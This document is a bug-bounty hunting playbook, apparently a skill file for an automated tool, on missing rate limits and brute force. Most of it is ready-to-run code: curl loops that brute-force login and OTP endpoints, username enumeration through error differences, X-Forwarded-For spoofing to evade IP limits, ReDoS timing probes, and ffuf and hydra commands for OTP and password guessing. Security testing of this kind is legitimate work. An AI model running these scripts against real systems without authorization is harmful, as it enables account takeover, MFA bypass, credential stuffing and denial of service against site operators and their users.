---
name: hunt-brute-force
description: Hunt Missing/Weak Rate Limiting — login brute force, OTP/2FA brute force (10^6), credential stuffing, username/email enumeration via error differences or timing, weak password policy, missing CAPTCHA, IP-based rate limit bypass via X-Forwarded-For, ReDoS. Medium to Critical depending on target.
sources: hackerone_public
report_count: 33
---

# HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration

## Crown Jewel Targets

OTP brute force (6-digit = 1,000,000 combinations) without rate limit = Critical ATO bypass.

**Highest-value chains:**
- **OTP brute force → MFA bypass → ATO** — no rate limit on /verify-otp, brute 000000-999999
- **Password reset token brute** — short/predictable tokens without expiry + no rate limit → ATO
- **Username enumeration → targeted credential stuffing** — different responses for valid/invalid + breach data
- **Coupon code brute** — no rate limit on discount code validation → 100% discount
- **ReDoS** — attacker-controlled regex causes exponential CPU spike → DoS

---

## Step-by-Step Hunting Methodology

### Phase 1 — Login Rate Limit Test
```bash
# Test how many failed logins before lockout/captcha
for i in $(seq 1 20); do
  RESP=$(curl -s -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"test@$TARGET\", \"password\": \"wrong$i\"}" \
    -o /dev/null -w "%{http_code}")
  echo "Attempt $i: $RESP"
  sleep 0.2
done
# If all 20 return 401 without lockout/429 → missing rate limit
```

### Phase 2 — OTP / 2FA Brute Force
```bash
# Test OTP endpoint (6-digit codes)
# PRE-REQUISITE: valid session pending OTP verification
SESSION_COOKIE="pre-auth-session-after-first-factor"

# Test first 100 codes to confirm no lockout (don't go to 999999 — PoC only needs 100)
for CODE in $(seq -f "%06g" 0 100); do
  RESP=$(curl -s -X POST https://$TARGET/api/verify-otp \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\": \"$CODE\"}" \
    -o /dev/null -w "%{http_code}")
  echo "$CODE: $RESP"
  [ "$RESP" = "429" ] && { echo "Rate limit triggered at $CODE"; break; }
done
# If 100 attempts with no 429/lockout → PoC complete, stop here
```

### Phase 3 — Username Enumeration
```bash
# Login endpoint: compare response for valid vs invalid username
VALID_USER="known-user@$TARGET"
INVALID_USER="definitely-not-real-xyz123@$TARGET"

RESP_VALID=$(curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$VALID_USER\", \"password\": \"wrongpassword\"}")
RESP_INVALID=$(curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$INVALID_USER\", \"password\": \"wrongpassword\"}")

echo "Valid user: $RESP_VALID"
echo "Invalid user: $RESP_INVALID"
# Different messages → username enumeration

# Password reset endpoint enumeration
curl -s -X POST https://$TARGET/forgot-password \
  -d "email=$VALID_USER" | grep -i "sent\|exist\|not found\|registered"
curl -s -X POST https://$TARGET/forgot-password \
  -d "email=$INVALID_USER" | grep -i "sent\|exist\|not found\|registered"

# Registration endpoint
curl -s -X POST https://$TARGET/api/register \
  -d "email=$VALID_USER" | grep -i "exist\|taken\|already"
```

### Phase 4 — IP Rotation Bypass
```bash
# Rate limits are often per-IP — test header-based bypass
for i in $(seq 1 30); do
  RAND_IP="$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).1"
  RESP=$(curl -s -X POST https://$TARGET/api/login \
    -H "X-Forwarded-For: $RAND_IP" \
    -H "X-Real-IP: $RAND_IP" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"test@$TARGET\", \"password\": \"wrong$i\"}" \
    -o /dev/null -w "%{http_code}")
  echo "Attempt $i (IP: $RAND_IP): $RESP"
done
```

### Phase 5 — Password Reset Token Entropy
```bash
# Collect 5 reset tokens for the same account and analyze
# (Use your own test account only)
for i in $(seq 1 5); do
  curl -s -X POST https://$TARGET/forgot-password \
    -d "email=your-test@email.com"
  # Check email, record token
  sleep 2
done
# Look for: sequential patterns, short length (<32 chars), predictable format
```

### Phase 6 — ReDoS Detection
```bash
# Test search / validation endpoints with catastrophic regex input
for LEN in 10 20 30 40 50; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")
  TIME=$(curl -s -o /dev/null -w "%{time_total}" \
    "https://$TARGET/search?q=$INPUT")
  echo "Length $LEN: ${TIME}s"
done
# If time grows exponentially → ReDoS confirmed
# Exponential: 10→0.1s, 20→0.3s, 30→1.2s, 40→5.8s
```

---

## Automation
```bash
# ffuf for OTP brute
ffuf -u https://$TARGET/api/verify-otp \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION" \
  -d '{"otp": "FUZZ"}' \
  -w <(seq -f "%06g" 0 100) \
  -mc 200

# hydra for login
hydra -l admin@target.com -P ~/wordlists/top-1000.txt $TARGET \
  http-post-form "/api/login:email=^USER^&password=^PASS^:Invalid"

# nuclei brute/rate-limit templates
nuclei -u https://$TARGET -t brute-force/ -severity medium,high,critical
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| No rate limit on OTP | MFA bypass → ATO | Critical |
| No rate limit on login + enum | Credential stuffing with breach data | High |
| IP bypass via X-Forwarded-For | Any brute force bypasses rate limit entirely | High |
| Password reset no expiry + brute | Token brute in time window | High |
| ReDoS on search | DoS targeting search servers | Medium |

---

## Validation

✅ OTP brute: 100 attempts submitted without lockout, response differs at valid code
✅ Enumeration: clearly different response for valid vs invalid accounts
✅ Rate limit bypass: X-Forwarded-For header rotation bypasses IP-based rate limit

**Severity:**
- No rate limit on OTP/MFA: High/Critical
- No rate limit on login + no lockout: Medium
- Username enumeration alone: Low-Medium
- ReDoS with meaningful server lag: Medium
